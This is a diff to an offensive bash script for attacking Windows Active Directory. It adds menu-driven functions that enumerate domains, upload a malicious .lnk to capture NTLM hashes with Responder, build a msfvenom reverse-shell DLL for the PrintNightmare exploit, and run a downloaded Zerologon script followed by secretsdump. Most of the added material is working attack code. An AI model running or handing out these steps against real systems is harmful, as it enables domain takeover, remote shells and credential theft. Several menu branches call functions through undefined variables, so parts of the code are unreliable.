@@ -1,10 +1,10 @@
 #!/bin/bash
 
 #IF UNKNOWN LEAVE BLANK
-DOMAINIP="192.168.0.44"
-DOMAIN="hatter.local" 
-USER="alice"
-PASS="P@ssw0rd1"
+DOMAINIP=""
+DOMAIN="" 
+USER=""
+PASS=""
 NTHASH="" #if you have an NT has put here
 
 #Color variables
@@ -38,7 +38,6 @@ echo "
 D) Download Tools
 1) Enumerate System
 2) Attack System
-3) Priv Esc
 99) Exit
 "
 
@@ -50,20 +49,9 @@ if [ $answer == 99 ]; then
 fi
 #Tools Download
 if [ $answer == D ]; then
-	$Y"Remember the moment you know exactly where you're goin
-	Cause the next moment before you know it
-	Time is slowin and it's frozen still
-	And the windowsill looks really nice, right?
-	You think twice about your life, it probably happens at night, right?
-	Fight it, take the pain, ignite it
-	Tie a noose around your mind, loose enough to breathe fine and tie it 
-	to a tree tell it, You belong to me
-	This ain't a noose, this is a leash
-	And I have news for you, you must obey me!"; $RE
-
-	$G"Updating system to make sure all tools can be found"; $RE
+	$G"Updating system to make sure all tools can be found"
 	sudo apt update
-	$R"Downloading Tools"; $RE
+	$R"Downloading Tools"; $Y
 	which rustscan
 	if [ $? != 0 ]; then
 		URL="https://github.com/RustScan/RustScan/releases/download/2.0.1/rustscan_2.0.1_amd64.deb" 
@@ -100,7 +88,7 @@ if [ $answer == D ]; then
 			if [ $? != 0 ]; then
 				sudo apt install golang
 			fi
-		$R"Making Directory ~/Tools and installing kerbrute"; $RE
+		$R"Making Directory ~/Tools and installing kerbrute"
 		mkdir ~/Tools
 		git clone https://github.com/ropnop/kerbrute.git ~/Tools
 		make all ~/Tools/kerbrute
@@ -144,7 +132,7 @@ if [ $answer == 1 ]; then
 		exit
 	fi
 
-	RUST="rustscan --ulimit 5000 -a $DOMAINIP"
+	RUST="rustscan --ulimit 5000 -a $DOMAINIP -- -Pn"
 	NMAP="nmap -p 80,8080,8000,443,8443,8433,1337,21,22,23,25,139,445,111,5985,3389,6667,5900,88,389 -vv -T4"
 	NP="$DOMAIN/ -no-pass -usersfile $USERSFILE -dc-ip $DOMAINIP"
 	RPC="""rpcclient -U "" -N $DOMAINIP"""
@@ -161,13 +149,18 @@ if [ $answer == 1 ]; then
 	IMP="Impacket.txt"
 	I=impacket
 
-	if [ $answer == 1 ]; then
+	ENUM_RUSTSCAN()
+	{
 		$RUST > $DOMAINIP.txt
-	fi
-	if [ $answer == 2 ]; then
-		$NMAP
-	fi
-	if [ $answer == 3 ]; then
+	}
+
+	ENUM_NMAP()
+	{
+		$NMAP > $DOMAINIP.txt
+	}
+
+	ENUM_KERBEROASTING()
+	{
 		$KER
 		read -p "Users file, if you do not have one, you can use /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt: " KER_USERS_FILE
 		if [ -z {$KER_USERS_FILE} ]; then
@@ -189,44 +182,98 @@ if [ $answer == 1 ]; then
 		$B"This is going to take a while depending on size of usernames list, make I suggest getting a health snack, like celery, not McDonalds..."; $RE
 		$LOC userenum $KER_USERS_FILE --dc $DOMAINIP -d $DOMAIN -t 200
 		fi
-	fi
-	if [ $answer == 4 ]; then
+	}
+
+	ENUM_GETNPUSERS()
+	{
 		read -p "Users file for GetNPUsers: " USERSFILE
 		$NP
-	fi
-	if [ $answer == 5 ]; then
+	}
+
+	ENUM_RPCCLIENT()
+	{
 		$R"Remember this is enumeration, seeing if RPC is open to no pass / user login. If you want to test for credential login please use the attack method"; $RE
 		$RPC
-	fi
-	if [ $answer == 6 ]; then
+	}
+
+	ENUM_LDAP_DOMAIN_DUMP()
+	{
 		$R"Remember this is enumeration, seeing if LDAP is open to no pass / user login. If you want to test for credential login please use the attack method"
-		$G"Making LDAP folder and putting domain information in there"; $R
+		$G"Making LDAP folder and putting domain information in there"; $RE
 		$LDAPMKDIR
 		$LDAP
 		mv domain_*.html LDAP/
-		$RE
 		read -p "Automatically start firefox with LDAP information that is found (if anonymous login not allow firefox will show a blank page)  (y/n)?: " answer
 		if [ $answer == y ]; then
 			firefox LDAP/domain_*.html
 		fi
-	fi
-	if [ $answer == 7 ]; then
+	}
+
+	ENUM_MOUNT_SMB_SHARE()
+	{
 		smbclient -L "\\\\$DOMAINIP\\"
 		read -p "SMBLOCATION: " SMBLOCATION
 		$SMBMKDIR		
 		$SMB
-	fi
-	if [ $answer == 8 ]; then
+	}
+
+	ENUM_ENUM4LINUX()
+	{
 		$ENUM4
-	fi
-	if [ $answer == 9 ]; then
+	}
+
+	ENUM_FTP()
+	{
 		$FTP
-	fi	
-	if [ $answer == 10 ]; then
+	}
+
+	ENUM_IMPACKET()
+	{
 		$M"Everything is being saved to Impacket.txt"
 		$I-samrdump $DOMAIN/ -no-pass -dc-ip $DOMAINIP > $IMP
 		$I-GetADUsers $DOMAIN/ -no-pass -dc-ip $DOMAINIP >> $IMP
 		$I-rpcdump $DOMAIN/ -no-pass -dc-ip $DOMAINIP >> $IMP
+	}
+
+
+	if [ $answer == 1 ]; then
+		$ENUM_RUSTSCAN
+	fi
+
+	if [ $answer == 2 ]; then
+		$ENUM_NMAP
+	fi
+	
+	if [ $answer == 3 ]; then
+		$ENUM_KERBEROASTING
+	fi
+
+	if [ $answer == 4 ]; then
+		$ENUM_GETNPUSERS
+	fi
+	
+	if [ $answer == 5 ]; then
+		$ENUM_RPCCLIENT
+	fi
+	
+	if [ $answer == 6 ]; then
+		$ENUM_LDAP_DOMAIN_DUMP
+	fi
+
+	if [ $answer == 7 ]; then
+		$ENUM_MOUNT_SMB_SHARE
+	fi
+
+	if [ $answer == 8 ]; then
+		$ENUM_ENUM4LINUX
+	fi
+
+	if [ $answer == 9 ]; then
+		$ENUM_FTP
+	fi	
+
+	if [ $answer == 10 ]; then
+		$ENUM_IMPACKET
 	fi
 
 	if [ $answer == T ]; then
@@ -379,7 +426,7 @@ if [ $answer == 2 ]; then
 
 	$R"Attacking System"; $RE
 	if [ -z "${DOMAINIP}" ] || [ -z "${DOMAIN}" ]; then
-		$Y"Need an IP address or domain to attack, please update in script";$RE
+		$Y"Need an IP address or domain to attack, please update in script, if unknown run enumeration tool first";$RE
 		exit
 	fi
 	ls $DOMAINIP.txt
@@ -400,7 +447,7 @@ if [ $answer == 2 ]; then
 	9)  Create .lnk to retrieve NTLM hashes from SMB Server
 	10) Print Nightmare
 	11) Zero Logon
-	A)  Auto Attack (Let the script do its thing)
+	A)  Auto Attack (Let the script do its thing), will not turn Print Nightmare, Zero Logon, or create a .lnk
 	T)  Listen to Tool (You know I had to put some music in here...)
 	99) exit"
 
@@ -409,6 +456,10 @@ if [ $answer == 2 ]; then
 		exit
 	fi
 	
+	read -p "LHOST: " LHOST
+	read -p "LPORT listening port: " LPORT
+	read -p "Kali web port: " WPORT
+
 	CRACKMAPEXECSMB()
 	{
 		$R"Running some CrackMapExec stuff, saving to $IMP"; $RE
@@ -535,6 +586,64 @@ Command=ToggleDesktop" > @evil.scf
 		firefox ldap/*.html
 	}
 
+	MOUNTSMB()
+	{
+		$SMBWPASS
+	}
+
+	MOUNTFTP()
+	{
+		mkdir FTP_Mount
+		curlftpfs $USER:$PASS@$DOMAINIP FTP_Mount
+	}
+
+	LNKLINK()
+	{
+		$G"Downloading mslink.sh"; $RE
+		wget https://raw.githubusercontent.com/overgrowncarrot1/Invoke-Everything/main/mslink.sh
+		read -p "$DOMAINIP Share Name: " SHARENAME
+		read -p "Interface to listen on (ex: eth0, tun0)" INT
+		$G"Creating share.lnk and zipping to share.zip"; $RE
+		bash mslink.sh -l open_me -n hook -i \\\\$LHOST\\share -o share.lnk
+		zip share.zip share.lnk
+		$R"Trying to upload share.zip into SMB Server with sharename $SHARENAME on RHOST $DOMAINIP, if this does not work please upload yourself"; $RE
+		smbclient "\\\\$DOMAINIP\\$SHARENAME" -c 'put share.zip' -U $USER
+		terminator --new-tab -e "sudo responder -I $INT -wv"
+	}
+
+	PRINTNIGHTMAREATTACK()
+	{
+		impacket-rpcdump @$DOMAINIP > print.txt
+		if grep 'MS-RPRN|MS-PAR' print.txt; then
+			$R"May be vulnerable"; $RE
+			$R"Depending on how your system is set-up attack may not work"; $RE
+			$Y"Downloading required tools"; $RE
+			python3 -m venv impakt
+			cd impakt
+			source bin/activate
+			git clone https://github.com/cube0x0/impacket
+			cd impacket
+			pip2 install .
+			pip3 install .
+			python3 ./setup.py install
+			$Y"Creating shell.dll file"; $RE
+			msfvenom -p windows/x64/shell/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f dll > shell.dll
+			python3 CVE-2021-1675.py "$DOMAIN/$USER:$PASS"@$DOMAINIP "\\\\$LHOST\\share\\shell.dll"
+			terminator --new-tab -e "impacket-smbserver share . -smb2support"
+		else
+			$C"Doesn't seem vulnerable"; $RE
+		fi
+	}
+
+	ZEROLOGON()
+	{
+		read -p "Share Name: " SHARENAME
+		wget https://raw.githubusercontent.com/zeronetworks/zerologon/master/zerologon.py
+		python3 zerologon.py "$SHARENAME" "$DOMAINIP"
+		$C"Running the following secretsdump.py -no-pass -just-dc $DOMAIN/"$SHARENAME$"@$DOMAINIP"; $RE
+		secretsdump.py -no-pass -just-dc $DOMAIN/"$SHARENAME$"@$DOMAINIP
+	}
+
 	if [ $answer == 1 ]; then
 		$CRACKMAPEXECSMB
 		$CRACKMAPEXECLDAP
@@ -560,7 +669,25 @@ Command=ToggleDesktop" > @evil.scf
 		$LDAP
 	fi
 
+	if [ $answer == 7 ]; then
+		$MOUNTSMB
+	fi
 
+	if [ $answer == 8 ]; then
+		$MOUNTFTP
+	fi
+
+	if [ $answer == 9 ]; then
+		$LNKLINK
+	fi
+
+	if [ $answer == 10 ]; then
+		$PRINTNIGHTMAREATTACK
+	fi
+
+	if [ $answer == 11 ]; then
+		$ZEROLOGON
+	fi
 
 	if [ $answer == A ]; then
 		$Y"Lean with it, rock with it
@@ -584,9 +711,13 @@ Command=ToggleDesktop" > @evil.scf
 		$SMBVULN
 		$LDAP
 		$IMPACKETSCRIPTS
+		$MOUNTSMB
+		$MOUNTFTP
 		$SMBKILLER
 		$BLOODHOUNDPYTHON
 		$CRACKMAPEXECSMB
 		$CRACKMAPEXECLDAP
 	fi
+exit
 fi
+
